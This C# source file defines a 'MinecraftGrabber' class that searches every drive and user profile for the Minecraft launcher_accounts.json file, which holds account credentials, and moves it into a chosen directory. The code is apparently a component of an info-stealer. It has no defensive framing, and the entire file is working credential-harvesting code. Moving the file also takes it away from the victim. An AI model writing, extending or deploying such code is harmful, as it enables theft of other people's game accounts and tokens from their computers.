using System.IO;

public class MinecraftGrabber
{
    public static void GrabMinecraft(string destinationDir)
    {
        foreach (var drive in DriveInfo.GetDrives())
        {
            foreach (var user in FileUtils.GetComputerUsers())
            {
                if (System.IO.Directory.Exists(drive + "\\Users\\" + user + "\\AppData\\Roaming\\.minecraft"))
                {
                    if (System.IO.File.Exists(drive + "\\Users\\" + user + "\\AppData\\Roaming\\.minecraft\\launcher_accounts.json"))
                    {
                        System.IO.File.Move(drive + "\\Users\\" + user + "\\AppData\\Roaming\\.minecraft\\launcher_accounts.json", destinationDir + "\\launcher_accounts.json");
                    }
                }
            }
        }
    }
}